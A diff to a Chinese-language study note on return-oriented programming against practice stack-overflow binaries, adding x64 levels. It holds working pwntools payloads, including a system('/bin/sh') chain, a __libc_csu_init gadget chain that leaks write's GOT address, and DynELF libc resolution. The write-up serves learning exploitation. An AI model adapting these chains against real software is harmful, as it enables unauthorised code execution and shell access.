@@ -5,6 +5,7 @@
 ## 总结
 很早之前看的两篇经典的rop文章。今天复习了一下x86中rop的利用方法，漏洞是简单的栈溢出，根据利用方式不同分四个level。  
 
+## x86
 ### level1   
 ```
 编译
@@ -107,3 +108,47 @@ payload += p32(system_addr) + p32(0xdeafbeaf) + p32(bss_addr)
 p.sendline(payload)
 p.sendline("/bin/sh\x00")
 ```
+
+## x64
+64位程序：可使用的地址空间<0x7fffffffffff，传参从rdi rsi rdx rcx r8 r9 到栈。程序都开启了ASLR和NX，没看canary。
+### level1
+修改返回值为system函数的地址即可。
+### level2
+程序给出了system的地址，构造rop。`payload = 'A'*136 + p64(poprdi_ret)  + p64(binsh_addr) + p64(system_addr)`
+
+### level3
+程序仅有一个栈溢出，存在read和write的got表。思路和之前一致，泄漏write函数的实际地址，计算system的地址，构造rop。重点在于rop的构造，利用__libc_csu_init函数中的gadgets。
+```
+400600:   4c 89 ea                mov    %r13,%rdx
+  400603:   4c 89 f6                mov    %r14,%rsi
+  400606:   44 89 ff                mov    %r15d,%edi
+  400609:   41 ff 14 dc             callq  *(%r12,%rbx,8)
+  40060d:   48 83 c3 01             add    $0x1,%rbx
+  400611:   48 39 eb                cmp    %rbp,%rbx
+  400614:   75 ea                   jne    400600 <__libc_csu_init+0x40>
+  400616:   48 83 c4 08             add    $0x8,%rsp
+  40061a:   5b                      pop    %rbx
+  40061b:   5d                      pop    %rbp
+  40061c:   41 5c                   pop    %r12
+  40061e:   41 5d                   pop    %r13
+  400620:   41 5e                   pop    %r14
+  400622:   41 5f                   pop    %r15
+  400624:   c3                      retq  
+
+#write(1,write_got,0x8)
+
+main = 0x400587
+poprbx = 0x40061a
+movrdx = 0x400600
+rbx = 0x0
+rbp = 0x1
+r12 = write_got # call *(write_got)
+r13 = 0x8 # third
+r14 = write_got # second
+r15 = 0x1 # first
+payload = 'B'*136 + p64(poprbx) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) +p64(r14) + p64(r15)
+payload += p64(movrdx) + p64(0xdeadbeaf)*7 + p64(main)
+
+```
+同样，通过DynELF来完成了无libc的函数泄漏，完成了exp_withoutlibc.py版的exp。
+注意，system函数调用execve来执行/bin/sh，而execve的参数有三个，和栈上的内容有关系，尽量把无关紧要的偏移用\x00来填充。此外，DynELF不是很稳定，多打几次就好了。
